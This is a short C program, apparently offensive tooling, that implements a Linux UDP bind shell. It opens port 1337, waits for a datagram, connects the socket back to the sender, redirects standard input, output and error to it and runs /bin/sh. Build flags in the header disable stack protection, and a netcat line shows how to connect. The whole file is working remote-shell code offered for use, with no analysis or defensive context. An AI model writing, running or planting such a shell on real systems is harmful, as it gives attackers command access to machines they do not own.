//Linux UDP bind shell c language code

/*
* Author:           FXC
* Build/Run:        gcc -z execstack -fno-stack-protector udp_bind_shell.c -o udp_bind_shell
*                   nc -lvnp 1337
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(void)
{
	char buf[0x800];
	socklen_t socklen;

	struct sockaddr_in addr;
	struct sockaddr_storage z;
	int sockfd, len= sizeof(z);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(1337);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	
	bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));

	recvfrom(sockfd, buf, 0x800, MSG_PEEK, (struct sockaddr*)&z, &len);

	connect(sockfd, (struct sockaddr *)&z, len);

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", NULL, NULL);
}
